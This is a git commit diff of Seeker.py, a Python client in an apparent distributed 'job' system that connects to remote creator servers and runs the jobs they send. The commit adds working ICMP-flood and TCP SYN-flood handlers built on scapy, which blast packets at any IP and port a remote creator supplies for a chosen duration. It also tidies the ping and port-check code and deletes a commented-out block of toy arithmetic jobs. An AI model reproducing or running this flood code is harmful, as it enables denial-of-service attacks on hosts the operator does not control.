cd016bb8b4e465c402eda8ff3dbda6f1649926b7
seanjan10 <49081307+seanjan10@users.noreply.github.com>
2020-11-24 22:18:46 -0500

    multi jobs should now work with more than 1 client

--- betaCode/Seeker.py
+++ betaCode/Seeker.py
@@ -1,11 +1,13 @@
 import socket
 import os
+import time
 from scapy.all import *
+
 
 def jobHandler(jobType, jobDesc, jobData, socket):
     if jobType == "check_If_Online":
-        icmp = IP(dst=jobData)/ICMP()
-        resp = sr1(icmp,timeout=10)
+        icmp = IP(dst=jobData) / ICMP()
+        resp = sr1(icmp, timeout=10)
         if resp != None:
             print("\nThe destination is online")
             socket.send("ONLINE".encode())
@@ -13,9 +15,8 @@ def jobHandler(jobType, jobDesc, jobData, socket):
             print("\nThe destination is unreachable.")
             socket.send("OFFLINE".encode())
     elif jobType == "detect_Port_Status":
-        ipAndPort=jobData.split("*")
-
-        pac = sr1(IP(dst=ipAndPort[0])/TCP(dport=int(ipAndPort[1])), timeout=1)
+        ipAndPort = jobData.split("*")
+        pac = sr1(IP(dst=ipAndPort[0]) / TCP(dport=int(ipAndPort[1])), timeout=1)
         try:
             pac.show()
             print("The port is open")
@@ -23,8 +24,21 @@ def jobHandler(jobType, jobDesc, jobData, socket):
         except:
             print("The port is closed")
             socket.send("PORT CLOSED".encode())
+    elif jobType == "icmp_flood_attack":
+        ipAndTime = jobData.split("*")
+        timeout = time.time() + int(ipAndTime[1])
+        while time.time() < timeout:
+            send(IP(dst=ipAndTime[0]) / ICMP(), count=1000)
+        print("ICMP flood finished\n")
+        socket.send("Flood_finished".encode())
+    elif jobType == "tcp_flood_attack":
+        ip_port_Time = jobData.split("*")
+        timeout = time.time() + int(ip_port_Time[2])
 
-        #send(pac)
+        while time.time() < timeout:
+            send(IP(dst=ip_port_Time[0])/TCP(sport=RandShort(), dport=int(ip_port_Time[1]), flags="S"), count = 1000)
+        print("TCP flood finished\n")
+        socket.send("Flood_finished".encode())
 
 
 def Main():
@@ -39,7 +53,7 @@ def Main():
             i = 0
         while True:
             try:
-                #print("Asking " + host[i] + ":" + str(port[i]) + " for a job...")
+                # print("Asking " + host[i] + ":" + str(port[i]) + " for a job...")
                 print("looking for " + host[i] + ":" + str(port[i]))
                 mySocket = socket.socket()
                 mySocket.connect((host[i], port[i]))
@@ -56,63 +70,27 @@ def Main():
             pass
         else:
             data = str(data)
-            #print("Job found from creater : " + data)
-            print("message recieved from creator" + data)
+            # print("Job found from creater : " + data)
+            print("Message recieved from creator\n" + data)
             status = input("Accept job? Y/N: ").upper()
 
             mySocket.send(status.encode())
             if (status == "Y"):
-                mySocket.settimeout(30)
-                #try:
+                mySocket.settimeout(45)
+                print("Waiting for creator to respond")
+
+                # try:
                 jobRECEIVE = mySocket.recv(1024).decode()
                 jobSPLIT = jobRECEIVE.split("$")
-
+                print(jobSPLIT[0])
+                #print(jobSPLIT[1])
+                #print(jobSPLIT[2])
                 jobHandler(jobSPLIT[0], jobSPLIT[1], jobSPLIT[2], mySocket)
-                #except:
-                 #   print("Uh oh. The creator was too slow!")
-           # data=mySocket.recv(1024).decode()
-            #print(f"message is {data}")
-            """
-            if status == "Y":
-                data = data.split(",")
-                jobType = data[0]
-                description = data[1]
-                nrOfSeekers = data[2]
-                jobInput = data[3]
-                print(jobType)
-                if jobType == "revStr":
-                    jobInput = jobInput[::-1]
-                    mySocket.send(jobInput.encode())
-                    print("Job Complete")
-                elif jobType == "Addition":
-                    numbers = jobInput.split("+")
-                    a = int(numbers[0])
-                    b = int(numbers[1])
-                    c = a + b
-                    mySocket.send(str(c).encode())
-                    print("Job Complete")
-                elif jobType == "Subtraction":
-                    numbers = jobInput.split("-")
-                    a = int(numbers[0])
-                    b = int(numbers[1])
-                    c = a - b
-                    mySocket.send(str(c).encode())
-                    print("Job Complete")
-                elif jobType == "Multiplication":
-                    numbers = jobInput.split("x")
-                    a = int(numbers[0])
-                    b = int(numbers[1])
-                    c = a * b
-                    mySocket.send(str(c).encode())
-                    print("Job Complete")
-                elif jobType == "RPS":
-                    mySocket.send(str(random.randint(1, 3)).encode())
-                    print("Job Complete")
-
-            
-            else:
-                mySocket.send("refuse".encode())
-            """
+                # except:
+                #   print("Uh oh. The creator was too slow!")
+            # data=mySocket.recv(1024).decode()
+            # print(f"message is {data}")
+     
         mySocket.close()
 
 
